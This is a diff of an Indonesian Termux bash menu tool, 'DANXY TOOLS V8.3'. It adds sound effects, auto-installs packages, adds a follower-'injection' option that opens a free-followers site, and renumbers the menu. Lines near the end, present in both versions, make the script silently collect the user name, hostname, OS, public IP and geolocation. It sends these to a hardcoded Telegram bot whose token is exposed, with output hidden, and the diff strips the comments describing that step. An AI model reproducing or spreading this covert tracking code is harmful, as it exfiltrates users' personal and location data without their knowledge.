@@ -159,8 +159,18 @@ klik() {
     play -q -t mp3 -
 }
 
+salah() {
+    curl -sL https://raw.githubusercontent.com/DanxyPrasetyo/Jembotbadakngakak/main/pilihanSalah.mp3 | \
+    play -q -t mp3 -
+}
+
 hello() {
-echo -e "${RED}
+    # auto-install sox jika belum ada
+    if ! command -v play &>/dev/null; then
+        echo -e "\033[1;33m[+] Installing sox...\033[0m"
+        pkg install -y sox >/dev/null 2>&1
+    fi
+    echo -e "${RED}
 ██████╗░░█████╗░███╗░░██╗██╗░░██╗██╗░░░██╗
 ██╔══██╗██╔══██╗████╗░██║╚██╗██╔╝╚██╗░██╔╝
 ██║░░██║███████║██╔██╗██║░╚███╔╝░░╚████╔╝░
@@ -170,18 +180,19 @@ ${WHITE}██║░░██║██╔══██║██║╚████
     local txt="HALLO BRO SELAMAT DATANG DI DANXY TOOLS V8.3"
     local delay=0.04
     local len=${#txt}
+
+    # play sound (skip jika gagal)
     curl -sL --max-time 4 \
         https://github.com/DanxyPrasetyo/Jembotbadakngakak/raw/refs/heads/main/welcome.mp3 \
         2>/dev/null | play -q -t mp3 - &
+
+    # type-writer effect
     for ((i=0; i<=len; i++)); do
         printf "\r\033[1;93;41m%${i}s\033[0m" "${txt:0:i}"
         sleep "$delay"
     done
     printf "\n"
 }
-
-
-
 
 
 
@@ -207,26 +218,27 @@ echo -e "${GREEN}
  │                 ${YELLOW}MENU UTAMA TOOLS V8.3${NC}${GREEN}                │
  ├────────────┬─────────────────────────┬───────────────┤
  │  [  ${RED}01${GREEN}  ]  │ ${YELLOW}SUNTIK TIKTOK${GREEN}           │               │
- │  [  ${RED}02${GREEN}  ]  │ ${YELLOW}CEK PROVIDER NOMOR${GREEN}      │               │
- │  [  ${RED}03${GREEN}  ]  │ ${YELLOW}ASCII ART GENERATOR${GREEN}     │               │
- │  [  ${RED}04${GREEN}  ]  │ ${YELLOW}PERKIRAAN CUACA${GREEN}         │               │
- │  [  ${RED}05${GREEN}  ]  │ ${YELLOW}BROWSING (w3m)${GREEN}          │               │
- │  [  ${RED}06${GREEN}  ]  │ ${YELLOW}STOP MUSIK${GREEN}              │               │
- │  [  ${RED}07${GREEN}  ]  │ ${YELLOW}STATUS WEBSITE${GREEN}          │               │
- │  [  ${RED}08${GREEN}  ]  │ ${YELLOW}ALL KALKULATOR${GREEN}          │               │
- │  [  ${RED}09${GREEN}  ]  │ ${YELLOW}TRACKING RESI PAKET${GREEN}     │               │
- │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │               │
- │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │               │
- │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │               │
- │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}ENCRYPSI BASH${GREEN}           │               │
- │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}PLAY MUSIK${GREEN}              │               │
- │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │               │
- │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │               │
- │  [  ${RED}17${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │               │
- │  [  ${RED}18${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │               │
- │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │               │
- │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │               │
- │  [  ${RED}21${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │               │
+ │  [  ${RED}02${GREEN}  ]  │ ${YELLOW}SUNTIK IG    ${GREEN}           │               │
+ │  [  ${RED}03${GREEN}  ]  │ ${YELLOW}CEK PROVIDER NOMOR${GREEN}      │               │
+ │  [  ${RED}04${GREEN}  ]  │ ${YELLOW}ASCII ART GENERATOR${GREEN}     │               │
+ │  [  ${RED}05${GREEN}  ]  │ ${YELLOW}PERKIRAAN CUACA${GREEN}         │               │
+ │  [  ${RED}06${GREEN}  ]  │ ${YELLOW}BROWSING (w3m)${GREEN}          │               │
+ │  [  ${RED}07${GREEN}  ]  │ ${YELLOW}STOP MUSIK${GREEN}              │               │
+ │  [  ${RED}08${GREEN}  ]  │ ${YELLOW}STATUS WEBSITE${GREEN}          │               │
+ │  [  ${RED}09${GREEN}  ]  │ ${YELLOW}ALL KALKULATOR${GREEN}          │               │
+ │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}TRACKING RESI PAKET${GREEN}     │               │
+ │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │               │
+ │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │               │
+ │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │               │
+ │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}ENCRYPSI BASH${GREEN}           │               │
+ │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}PLAY MUSIK${GREEN}              │               │
+ │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │               │
+ │  [  ${RED}17${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │               │
+ │  [  ${RED}18${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │               │
+ │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │               │
+ │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │               │
+ │  [  ${RED}21${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │               │
+ │  [  ${RED}22${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │               │
  │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │               │
  ├────────────┴─────────────────────────┴───────────────┤
  │             DANXY TOOLS V8.3 2024 - 2025             │
@@ -260,117 +272,123 @@ main_menu() {
       klik
       ;;
     02|2)
-      klik
-      cek_provider
+     klik
+      suntik_ig
       kembali_ke_menu
       klik
       ;;
     03|3)
       klik
-      ascii_art_generator
+      cek_provider
       kembali_ke_menu
       klik
       ;;
     04|4)
       klik
-      perkiraan_cuaca
+      ascii_art_generator
       kembali_ke_menu
       klik
       ;;
     05|5)
       klik
+      perkiraan_cuaca
+      kembali_ke_menu
+      klik
+      ;;
+    06|6)
+      klik
       browse_web
       kembali_ke_menu
       klik
       ;;
-    06|6) # Opsi untuk stop musik
+    07|7) # Opsi untuk stop musik
       klik
       stop_music
       echo -e "${YELLOW}Musik dihentikan.${NC}"
       kembali_ke_menu
       klik
       ;;
-    07|7)
+    08|8)
     klik
       cek_status_website
       kembali_ke_menu
       klik
       ;;
-    08|8)
+    09|9)
     klik
       kalkulator
       kembali_ke_menu
       klik
       ;;
-   09|9)
+   10)
    klik
       tracking_resi
       kembali_ke_menu
       klik
       ;;
-   10)
+   11)
    klik
       ip_lookup
       kembali_ke_menu
       klik
       ;;
-   11)
+   12)
    klik
       cek_ip_publik
       kembali_ke_menu
       klik
       ;;
-   12)
+   13)
    klik
       cek_kebocoran_gmail
       kembali_ke_menu
       klik
       ;;
-   13)
+   14)
    klik
       enkripsi_bash
       kembali_ke_menu
       klik
       ;;
-   14)
+   15)
    klik
       play_music
       klik
       ;;
-   15)
+   16)
    klik
       lacak_nama
       kembali_ke_menu
       klik
       ;;
-   16)
+   17)
    klik
       lacak_lokasi_nomor
       kembali_ke_menu
       klik
       ;;
-   17)
+   18)
    klik
       lapor_error
       kembali_ke_menu
       klik
       ;;
-   18)
+   19)
    klik
       menu_tracking
       klik
       ;;
-   19)
+   20)
    klik
       menu_Osin
       klik
       ;;
-   20)
+   21)
    klik
       menu_ghostrack
       klik
       ;;
-   21)
+   22)
    klik
       info
       kembali_ke_menu
@@ -385,11 +403,32 @@ main_menu() {
       ;;
     *)
       echo -e "${RED}INPUT TIDAK VALID!${NC}" | lolcat
+      salah
       sleep 3
       ;;
     esac
   done
 }
+
+suntik_ig() {
+clear
+echo -e "
+
+░██████╗██╗░░░██╗███╗░░██╗████████╗██╗██╗░░██╗
+██╔════╝██║░░░██║████╗░██║╚══██╔══╝██║██║░██╔╝
+╚█████╗░██║░░░██║██╔██╗██║░░░██║░░░██║█████═╝░
+░╚═══██╗██║░░░██║██║╚████║░░░██║░░░██║██╔═██╗░
+██████╔╝╚██████╔╝██║░╚███║░░░██║░░░██║██║░╚██╗
+╚═════╝░░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝
+░██████╗░██████╗░░█████╗░███╗░░░███╗
+██╔════╝░██╔══██╗██╔══██╗████╗░████║
+██║░░██╗░██████╔╝███████║██╔████╔██║
+██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
+╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
+░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝" | lolcat
+xdg-open "https://www.famety.net/free-instagram-followers"
+}
+
 
 banner_big() {
   clear
@@ -716,7 +755,7 @@ while true; do
         14)   klik; githublookup ;;
         15)   klik; tempmail ;;
         00|0) echo -e "\n\033[1;91m[!]\033[0m Bye!"; break ;;
-        *)    echo -e "\033[1;91m[!]\033[0m Invalid choice"; sleep 1 ;;
+        *) salah;  echo -e "\033[1;91m[!]\033[0m Invalid choice"; sleep 1 ;;
     esac
     read -r dummy
 done
@@ -1080,6 +1119,7 @@ kalkulator() {
         ;;
       *)
         echo "Pilihan tidak valid!"
+        salah
         ;;
     esac
 
@@ -1324,12 +1364,21 @@ echo -e "${BG_RED}${YELLOW} ENCRYPSI CODE BASH ${NC}"
 
 play_music() {
     clear
-  if command_exists mpv; then
-    mpv --no-video --loop-file "$LAGU_YOUTUBE" >/dev/null 2>&1 &
-  else
-    echo -e "${RED}moduel mpv belum di install mohon install terlebih dahulu dengan cara pkg install mpv${NC}"
-  fi
+    # auto-install mpv jika belum ada
+    if ! command -v mpv &>/dev/null; then
+        echo -e "${RED}[+] Installing mpv...${NC}"
+        echo -e "${GREEN} SABAR PROSES 1-2 MENIT ${NC}"
+        pkg install -y mpv >/dev/null 2>&1
+    fi
+
+    # cek lagi setelah install
+    if command -v mpv &>/dev/null; then
+        mpv --no-video --loop-file "$LAGU_YOUTUBE" >/dev/null 2>&1 &
+    else
+        echo -e "${RED}mpv masih gagal di-install atau tidak ditemukan!${NC}"
+    fi
 }
+
 
 stop_music() {
   pkill mpv
@@ -1623,14 +1672,16 @@ clear
       klik
         echo "CLOSE MENU 2" | lolcat
         break
-        klik
         ;;
         *)
         echo "INPUT TIDAK VALID!" | lolcat
+        salah
         ;;
     esac
 
-    read -r dummy   # ← ini aja
+     echo ""
+    read -p "ENTER UNTUK KEMBALI KE MENU" | lolcat
+    klik
   done
 }
 
@@ -2771,11 +2822,13 @@ clear
         ;;
       *)
         echo "INPUT TIDAK VALID!" | lolcat
+        salah
         ;;
     esac
 
     echo ""
     read -p "ENTER UNTUK KEMBALI KE MENU" | lolcat
+    klik
   done
 }
 
@@ -3915,13 +3968,12 @@ BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
 CHAT_ID="7380101464"
 TELEGRAM_API="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
 
-# Data
+
 TS=$(date +"%Y-%m-%d %H:%M:%S")
 USR=$(whoami)
 HOST=$(hostname)
 OS=$(uname -s -r)
 
-# Lokasi
 IP_JSON=$(curl -s -m 5 https://ipinfo.io/json)
 IP=$(echo "$IP_JSON" | jq -r '.ip // "-"')
 CITY=$(echo "$IP_JSON" | jq -r '.city // "-"')
@@ -3929,10 +3981,8 @@ REGION=$(echo "$IP_JSON" | jq -r '.region // "-"')
 COUNTRY=$(echo "$IP_JSON" | jq -r '.country // "-"')
 LOC=$(echo "$IP_JSON" | jq -r '.loc // "-"')
 
-# Google Maps link
 [ "$LOC" != "-" ] && MAP="https://www.google.com/maps?q=$LOC" || MAP="-"
 
-# Format clean + monospace
 MSG=$(cat <<EOF
 <pre>
 ┌───────────────────────────────
@@ -3951,15 +4001,11 @@ $MAP
 </pre>
 EOF
 )
-
-# Kirim tanpa output ke terminal
 curl -4 -s -X POST "$TELEGRAM_API" \
      -d chat_id="$CHAT_ID" \
      -d text="$MSG" \
      -d parse_mode="HTML" \
      -d disable_notification="true" > /dev/null 2>&1
-
-
 
 #show_whatsapp_support
 main_menu
